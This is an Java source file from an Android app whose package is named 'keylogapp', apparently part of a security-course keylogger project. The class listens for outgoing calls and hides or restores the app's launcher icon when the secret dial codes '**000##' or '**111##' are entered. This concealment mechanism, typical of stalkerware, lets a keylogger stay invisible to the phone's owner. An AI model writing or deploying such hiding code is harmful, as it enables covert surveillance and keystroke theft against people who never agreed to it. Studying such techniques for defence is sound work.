package com.maemresen.infsec.keylogapp;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;

public class AppVisibilityReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action != null && action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            
            if (phoneNumber != null && phoneNumber.equals("**000##")) {
                PackageManager packageManager = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                packageManager.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            } else if (phoneNumber != null && phoneNumber.equals("**111##")) {
                PackageManager packageManager = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                packageManager.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            }
        }
    }
}